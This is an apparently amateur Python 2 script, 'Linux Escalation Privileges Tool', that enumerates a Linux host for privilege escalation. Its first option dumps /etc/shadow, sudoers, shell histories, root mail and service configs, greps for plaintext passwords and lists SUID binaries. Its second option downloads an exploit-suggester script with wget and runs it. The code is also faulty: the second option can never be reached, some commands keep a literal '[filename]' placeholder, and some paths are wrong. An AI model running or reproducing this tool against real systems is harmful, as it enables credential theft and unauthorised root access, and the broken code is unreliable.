#!/usr/bin/env python
# -*- coding: utf-8 -*-


import os
import sys
from time import sleep

class col:
    GRE  = '\033[92m'
    RED  = '\033[91m'
    YEL  = '\033[93m'
    END  = '\033[0m' 


def _print_welcome():
    print'-' * 50
    print '┬ ┬┌─┐┌─┐┬ ┬┬─┐┌─┐┌─┐'
    print '│ │├─┘└─┐│ │├┬┘│ ┬├┤'
    print '└─┘┴  └─┘└─┘┴└─└─┘└─┘', col.RED+'Linux Escalation Privileges Tool'+col.END
    print col.RED+'By:'+col.END, col.YEL+'InsaneGroove'+col.END
    print col.RED+'github.com/'+col.END, col.YEL+'InsaneGroove'+col.END
    print '_' * 50

_print_welcome()

def options():

    
    print 'What do you want to do? '
    print
    print '[1] Escalation directories.'
    print '[2] Linux exploit suggester.'
    print

    option = raw_input('Select your option: ')

    if option == '1':
        print
        print  col.YEL+'[*]Loading...'+col.END
        print
        print col.RED+'Linux distribution and version.'+col.END
        os.system('cat /etc/issue')
        print '=' * 50
        print col.RED+'Kernel Version'+col.END
        os.system('cat /proc/version')
        print '=' * 50
        print col.RED+'Environment variables.'+col.END
        os.system('cat /etc/profile')
        print '=' * 50
        print col.RED+'Services currently running (also as root)'+col.END
        os.system('cat /etc/service')
        os.system('ps aux | grep root')
        print '=' * 50
        print col.RED+'Web server configuration.'+col.END
        os.system('cat /etc/chttp.conf')
        os.system('cat /etc/lighttpd.conf')
        os.system('cat /etc/apache2/apache2.conf')
        os.system('cat /etc/httpd/conf/httpd.conf')
        os.system('cat /opt/lampp/etc/httpd.conf')
        print '=' * 50
        print col.RED+'PHP Configuration.'+col.END
        os.system('/etc/php5/apache2/php.ini')
        print '=' * 50
        print col.RED+'My SQl'+col.END
        os.system('cat /etc/my.conf')
        print '=' * 50
        print col.RED+'Locate any plaintext usernames and passwords.'+col.END
        os.system('grep -i user [filename]')
        os.system('grep -i pass [filename]')
        os.system('grep -C 5 "password" [filename]')
        os.system('find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla')
        print '=' * 50
        print col.RED+'List Sudoers'+col.END
        os.system('cat /etc/sudoers')
        print '=' * 50
        print col.RED+'Show which commands sudo allows you to run.'+col.END
        os.system('sudo -l')
        print '=' * 50
        print col.RED+'Attempt to display sensitive files.'+col.END
        os.system('cat /etc/passwd')
        os.system('cat /etc/group')
        os.system('cat /etc/shadow')
        os.system('ls -alh /var/mail/')
        print '=' * 50
        print col.RED+'Check for anything interesting in home directories.'+col.END
        os.system('ls -ahlR /root/')
        os.system('ls -ahlR /home/')
        print '=' * 50
        print col.RED+'Check user history for credentials and activity.'+col.END
        os.system('cat ~/.bash_history')
        os.system('cat ~/.nano_history')
        os.system('cat ~/.atftp_history')
        os.system('cat ~/.mysql_history')
        os.system('cat ~/.php_history')
        print '=' * 50
        print col.RED+'Check user profile and mail'+col.END
        os.system('cat ~/.bashrc')
        os.system('cat ~/.profile')
        os.system('cat /var/mail/root')
        os.system('cat /var/spool/mail/root')
        print '=' * 50
        print col.RED+'Show directories with possible root'+col.END
        os.system('find / -uid 0 -perm -4000 -type f 2>/dev/null')
        print
        print 'Finished!'
        sys.exit()
    else:
        print '-_- Something went wrong!'

    if option == '2':
        print
        print col.RED+'Linux exploit sugester by: bcoles and mzet-'+col.END
        print col.RED+'Link: github.com/mzet-/linux-exploit-suggester'+col.END
        print col.YEL+'[*]Loading...'+col.END
        os.system('wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh')
        os.system('chmod +x les.sh')
        os.system('./les.sh')
        print 'Finished!'
        sys.exit()


options()
